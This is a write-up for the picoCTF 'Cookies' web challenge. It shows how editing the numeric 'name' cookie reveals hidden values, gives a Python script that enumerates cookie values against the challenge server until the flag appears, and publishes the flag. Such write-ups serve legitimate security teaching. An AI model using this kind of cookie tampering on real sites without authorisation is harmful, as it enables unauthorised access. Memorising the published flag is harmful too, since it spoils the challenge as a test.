---
layout: page
title: Cookies
exclude: true
---

## Summary
- **Category:** Web Exploitation
- **Difficulty:** Very Easy
- **Main Topics:** Cookies
- [**CTF webpage**](https://play.picoctf.org/practice/challenge/173?category=1&page=1)

## Cookies
> Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/) 

The first step is to connect to the website that shows the following homepage.

<img src='{{ '/pico/cookies/imgs/cookies.png' | relative_url }}' width='50%'>

Enter `snickerdoodle` in the input field and go to the `Storage` tab of devtools in your browser to analyze
cookie values. You can see that the value of the `name` cookie changes from `-1` to `0`.

Increasing the value of the cookie from `1` to `2` shows that `oatmeal` is another accepted word.
Repeating this process until you get the flag can be tedious, so you can run the following script:
{% highlight python %}
import requests

for i in range(29):
    cookies = {'name': str(i)}
    request = requests.get('http://mercury.picoctf.net:21485/check', cookies=cookies)
    result = request.text
    
    print(f'[+] Testing Cookie: {i}\t| Result: ', end='')
    if "I love" not in result:
        print(result.split('<code>')[1].split('</code>')[0])
        break
    else:
        print('No flag found')
{% endhighlight %}

**Flag:** `picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}`
